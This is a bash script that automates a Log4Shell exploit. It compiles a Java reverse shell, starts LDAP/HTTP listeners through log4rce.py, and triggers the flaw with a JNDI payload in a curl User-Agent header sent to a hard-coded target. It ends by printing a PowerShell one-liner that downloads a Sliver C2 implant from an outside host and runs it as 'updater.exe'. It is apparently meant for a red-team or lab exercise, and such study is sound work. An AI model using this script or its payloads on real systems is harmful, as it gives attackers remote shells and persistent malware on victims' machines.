#!/bin/bash

attacker_ip="<set IP>" # IP address of the host executing this script
vulnerable_url="http://208.11.21.100:8080/msn_apps/api/vulnerable/user" # Url vulnerable to Log4j
reverse_shell="./ReverseShell" # Do not include file extention, e.g. '/home/user/folder/ReverseShell'
c2_payload_url='http://94.249.192.5:8000/missingno.exe' # Location of where the Sliver malware is hosted
log4rce="./log4rce.py" # Path to log4rce.py


# 0. Reminders/Prep
printf "\n\nPre-Flight checklist:\n"
printf "[] Did you start you TCP reverse shell listener (e.g. netcat)?\n"
printf "[] Did you update IP/Port in ReverseShell.java to match the reverse shell listener?\n"
printf "[] Did you verify all variables at the top of $(basename "$0") script are properly set?\n"
printf "\n\n"

for i in {7..1}; do
    echo -ne "Executing in: $i\r"
    sleep 1
done


# 1. Compile reverse shell payload
printf '   [+] Compiling reverse shell payload ...\n'
javac -source 1.7 -target 1.7 $reverse_shell.java -Xlint:-options
printf "\n   [+] Reverse shell compiled ...\n"
sleep 1


# 2. Execute log4rce.py, which will start listeners to deliver java reverse shell paylaod
printf "\n   [+] Starting LDAP server listener ...\n"
python3 $log4rce --java_class $reverse_shell.class --ldap_rhost "$attacker_ip" --http_rhost "$attacker_ip" &
py_pid=$! # Saving PID to kill processes later
sleep 3


# 3. Send web request which triggers Log4j vulnerability in the User-Agent field
printf "\n   [+] Triggering Log4j exploit ...\n"
curl -A "\${jndi:ldap://$attacker_ip:1387/ReverseShell}" $vulnerable_url &
curl_pid=$! # Saving PID to kill processes later
sleep 5


# 4. Kill the python and curl processes to save resources
printf "\n   [+] Attempting to kill associated scripts ...\n"
printf "\n   [+] Killing (3) python processes ...\n"
kill -9 $py_pid `expr $py_pid + 2` `expr $py_pid + 3`
sleep 1
printf "\n   [+] Killing curl process ...\n"
kill -9 $curl_pid
sleep 1
printf "\n   [+] Be sure to cleanup manually if there were any errors during the cleanup above\n"


# 5. Move on the next pahse of attack
printf "\n\n   [+] Log4j exploit sent, check for reverse shell.\n"
printf "\n\n   [+] Now transfer and execute the C2 implant with the below command on the victim host:\n"
printf "powershell -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '$c2_payload_url' -OutFile '%%appdata%%\\\updater.exe'; %%appdata%%\\\updater.exe\"\n\n"